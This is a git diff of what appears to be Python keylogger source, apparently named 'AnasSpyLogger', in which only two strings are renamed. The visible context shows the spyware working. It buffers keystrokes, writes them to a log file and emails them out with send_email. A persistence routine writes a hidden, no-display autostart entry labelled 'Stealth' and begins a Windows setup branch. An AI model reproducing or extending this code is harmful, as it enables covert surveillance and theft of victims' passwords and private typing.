@@ -113,7 +113,7 @@ def on_press(key):
     if len(buffer) >= buffer_limit:
         with open(log_file, 'a') as f:
             f.write('\n'.join(buffer) + '\n')
-        send_email("Keylogger Report", '\n'.join(buffer))
+        send_email("AnasSpyLogger Report", '\n'.join(buffer))
         buffer.clear()
 
 # ===== بدء تشغيل اللوجر =====
@@ -141,7 +141,7 @@ def persist_script():
             f.write("Hidden=true\n")
             f.write("NoDisplay=true\n")
             f.write("X-GNOME-Autostart-enabled=true\n")
-            f.write("Comment=Stealth Keylogger for Anas\n")
+            f.write("Comment=Stealth AnasSpyLogger for Anas\n")
 
     elif system == "Windows":
         print("[*] System: Windows - Setting up Launch Agent...")
